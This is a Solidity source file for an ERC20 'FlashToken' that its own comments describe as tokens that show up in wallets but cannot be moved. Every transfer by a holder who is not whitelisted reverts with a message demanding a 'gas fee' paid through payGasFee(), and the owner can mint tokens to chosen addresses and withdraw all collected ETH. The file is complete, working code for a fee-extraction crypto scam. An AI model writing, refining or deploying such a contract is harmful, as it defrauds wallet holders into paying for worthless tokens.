// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title FlashToken
 * @dev Flash tokens appear in wallets but cannot be transferred.
 * Users attempting to send flash tokens receive an error requesting gas fees.
 * Only the contract owner can mint and set gas rates.
 */
contract FlashToken is ERC20, Ownable {
    
    // Gas fee structure (in wei)
    uint256 public gasFeeBps; // Basis points (1 BPS = 0.01%)
    uint256 public minGasFee; // Minimum gas fee in wei
    uint256 public maxGasFee; // Maximum gas fee in wei
    
    // Mapping to track gas payments and attempts
    mapping(address => bool) public approvedSenders;
    mapping(address => uint256) public gasBalance;
    mapping(address => GasPaymentRecord[]) public gasPaymentHistory;
    
    struct GasPaymentRecord {
        uint256 amount;
        uint256 timestamp;
        string txHash;
    }
    
    // Events
    event FlashTokensMinted(address indexed to, uint256 amount);
    event TransferAttempted(address indexed from, address indexed to, uint256 amount, string reason);
    event GasFeePaid(address indexed payer, uint256 amount);
    event GasFeeUpdated(uint256 newBps, uint256 minFee, uint256 maxFee);
    event ApprovedSenderUpdated(address indexed sender, bool approved);

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        uint256 _gasFeeBps,
        uint256 _minGasFee,
        uint256 _maxGasFee
    ) ERC20(name, symbol) Ownable(msg.sender) {
        gasFeeBps = _gasFeeBps;
        minGasFee = _minGasFee;
        maxGasFee = _maxGasFee;
        
        // Mint initial supply to owner
        _mint(msg.sender, initialSupply * 10 ** decimals());
    }

    /**
     * @dev Distribute flash tokens to addresses
     * Only owner can call this
     */
    function distributeFlashTokens(
        address[] calldata recipients,
        uint256[] calldata amounts
    ) external onlyOwner {
        require(recipients.length == amounts.length, "Array length mismatch");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i] * 10 ** decimals());
            emit FlashTokensMinted(recipients[i], amounts[i] * 10 ** decimals());
        }
    }

    /**
     * @dev Mint flash tokens - only owner
     */
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount * 10 ** decimals());
        emit FlashTokensMinted(to, amount * 10 ** decimals());
    }

    /**
     * @dev Calculate gas fee for sending tokens
     */
    function calculateGasFee(uint256 amount) public view returns (uint256) {
        uint256 fee = (amount * gasFeeBps) / 10000;
        
        if (fee < minGasFee) {
            fee = minGasFee;
        } else if (fee > maxGasFee) {
            fee = maxGasFee;
        }
        
        return fee;
    }

    /**
     * @dev Pay gas fee to unlock token sending ability
     * This is a placeholder - in real scenario, this would unlock temporary sending capability
     */
    function payGasFee() external payable {
        require(msg.value > 0, "Gas fee must be greater than 0");
        
        gasBalance[msg.sender] += msg.value;
        
        GasPaymentRecord memory record = GasPaymentRecord({
            amount: msg.value,
            timestamp: block.timestamp,
            txHash: ""
        });
        
        gasPaymentHistory[msg.sender].push(record);
        emit GasFeePaid(msg.sender, msg.value);
    }

    /**
     * @dev Get gas payment history for an address
     */
    function getGasPaymentHistory(address user) 
        external 
        view 
        returns (GasPaymentRecord[] memory) 
    {
        return gasPaymentHistory[user];
    }

    /**
     * @dev Update gas fee parameters - only owner
     */
    function updateGasFee(
        uint256 newBps,
        uint256 newMinFee,
        uint256 newMaxFee
    ) external onlyOwner {
        require(newBps <= 10000, "BPS cannot exceed 10000");
        require(newMinFee <= newMaxFee, "Min fee must be <= max fee");
        
        gasFeeBps = newBps;
        minGasFee = newMinFee;
        maxGasFee = newMaxFee;
        
        emit GasFeeUpdated(newBps, newMinFee, newMaxFee);
    }

    /**
     * @dev Whitelist/approve senders who can send tokens
     */
    function setApprovedSender(address sender, bool approved) external onlyOwner {
        approvedSenders[sender] = approved;
        emit ApprovedSenderUpdated(sender, approved);
    }

    /**
     * @dev Override transfer - BLOCKS all transfers unless gas is paid
     * This is the key mechanism - shows error when attempting to send
     */
    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        
        // Check if sender has paid gas fee
        if (gasBalance[owner] == 0 && !approvedSenders[owner]) {
            // Calculate required gas fee
            uint256 requiredFee = calculateGasFee(amount);
            
            emit TransferAttempted(
                owner,
                to,
                amount,
                string(abi.encodePacked(
                    "FLASH_TOKEN_ERROR: Cannot transfer flash tokens without paying gas fee. Required gas fee: ",
                    uint2str(requiredFee),
                    " wei. Call payGasFee() to enable transfers."
                ))
            );
            
            revert(string(abi.encodePacked(
                "FLASH_TOKEN_ERROR: Cannot transfer flash tokens without paying gas fee. Required gas fee: ",
                uint2str(requiredFee),
                " wei"
            )));
        }
        
        // If gas is paid, deduct it and allow transfer
        if (gasBalance[owner] > 0) {
            uint256 requiredFee = calculateGasFee(amount);
            require(gasBalance[owner] >= requiredFee, "Insufficient gas balance");
            gasBalance[owner] -= requiredFee;
        }
        
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev Override transferFrom - BLOCKS unless gas is paid
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        address spender = _msgSender();
        
        // Check if sender has paid gas fee
        if (gasBalance[from] == 0 && !approvedSenders[from]) {
            uint256 requiredFee = calculateGasFee(amount);
            
            emit TransferAttempted(
                from,
                to,
                amount,
                string(abi.encodePacked(
                    "FLASH_TOKEN_ERROR: Cannot transfer flash tokens without paying gas fee. Required gas fee: ",
                    uint2str(requiredFee),
                    " wei"
                ))
            );
            
            revert(string(abi.encodePacked(
                "FLASH_TOKEN_ERROR: Cannot transfer flash tokens without paying gas fee. Required gas fee: ",
                uint2str(requiredFee),
                " wei"
            )));
        }
        
        if (gasBalance[from] > 0) {
            uint256 requiredFee = calculateGasFee(amount);
            require(gasBalance[from] >= requiredFee, "Insufficient gas balance");
            gasBalance[from] -= requiredFee;
        }
        
        _approve(from, spender, allowance(from, spender) - amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Utility function to convert uint to string
     */
    function uint2str(uint _i) internal pure returns (string memory) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    /**
     * @dev Withdraw collected gas fees - only owner
     */
    function withdrawGasFees() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        (bool success, ) = owner().call{value: balance}("");
        require(success, "Withdrawal failed");
    }

    /**
     * @dev Receive ETH
     */
    receive() external payable {
        gasBalance[msg.sender] += msg.value;
    }
}
